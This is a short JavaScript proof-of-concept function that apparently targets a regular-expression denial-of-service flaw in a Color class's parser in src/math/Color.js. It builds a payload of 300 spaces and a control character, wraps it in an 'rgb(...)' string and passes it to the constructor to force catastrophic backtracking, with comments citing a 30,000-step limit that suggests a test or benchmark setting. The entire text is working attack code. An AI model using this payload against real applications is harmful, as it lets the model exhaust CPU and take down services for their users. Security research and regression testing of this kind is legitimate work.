async function exploit() {
  // The vulnerability in src/math/Color.js stems from ambiguous quantifier interactions:
  // /^(\\d+)\\s*,\s*(\\d+)/ ... 
  // When input begins with whitespace followed by a character that matches neither digits nor whitespace,
  // the regex engine greedily consumes spaces via \s*, fails on (\d+), and backtracks one step at a time.
  // This creates O(n^2) complexity. With n=300, the theoretical backtrack steps exceed 45,000, surpassing the 30,000 limit.

  const reDoSPayload = '\x20'.repeat(300) + '\x01';
  console.log(`[PoC] Triggering ReDoS with payload length: ${reDoSPayload.length}`);

  // Construct the malformed color string that routes to the vulnerable regex branch
  const maliciousColorString = `rgb(${reDoSPayload})`;

  // This execution invokes the Color parser in src/math/Color.js.
  // In the unpatched version, the regex engine will exceed the specified 
  // 30,000 backtracking limit and cause catastrophic CPU consumption or a timeout/crash.
  const colorInstance = new Color(maliciousColorString);

  return colorInstance;
}

